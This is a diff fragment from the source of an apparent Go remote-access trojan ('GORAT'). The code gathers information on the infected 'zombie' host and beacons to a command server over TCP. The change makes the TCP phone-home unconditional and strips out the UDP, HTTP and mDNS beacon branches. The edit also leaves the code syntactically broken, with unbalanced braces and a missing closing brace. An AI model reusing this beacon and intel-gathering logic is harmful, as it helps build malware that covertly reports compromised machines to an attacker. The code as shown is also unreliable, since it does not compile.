@@ -74,27 +74,16 @@ func main() {
 	// we call it by it's module name anyways. This is why we should use unique names
 	Intel.GatherIntel(ZombieInformation)
 
-	if Core.BEACON_ON_START == true {
-		switch Core.BACON_TYPE {
-		case "tcp":
-			tcp_connection, derp := Beacons.BaconTCP(Core.PHONEHOME_TCP)
-			if derp != nil {
+	//if Core.BEACON_ON_START == true {
+	//	switch Core.BACON_TYPE {
+	//	case "tcp":
+	tcp_connection, derp := Beacons.BaconTCP(Core.PHONEHOME_TCP)
+	if derp != nil {
 				ErrorHandling.RatLogError(derp, "[-] Beacon TCP failed to connect to command, stopping beacon")
 			}
 
-		case "udp":
-			udp_conn, derp := Beacons.BeaconUDP(Core.PHONEHOME_UDP)
-			if derp != nil {
-				ErrorHandling.RatLogError(derp, "[-] Beacon UDP failed to connect to command, stopping beacon")
-			}
-		case "http":
-			// function to call other beacons depending on second param
-			http_response, derp := Beacons.BeaconHTTP(Core.Remote_http_addr, Core.BEACONHTTPTYPE)
-			if derp != nil {
-				ErrorHandling.RatLogError(derp, "[-] HTTP Error:")
-			}
-		case "mdns":
-			// Setup our service export
+	//http_response, derp := Beacons.BeaconHTTP(Core.Remote_http_addr, Core.BEACONHTTPTYPE)
+	// Setup our service export
 			servicename := "GORAT!"
 			host, derp := os.Hostname()
 			if derp != nil {
@@ -115,4 +104,4 @@ func main() {
 		}
 	}
 
-}
+
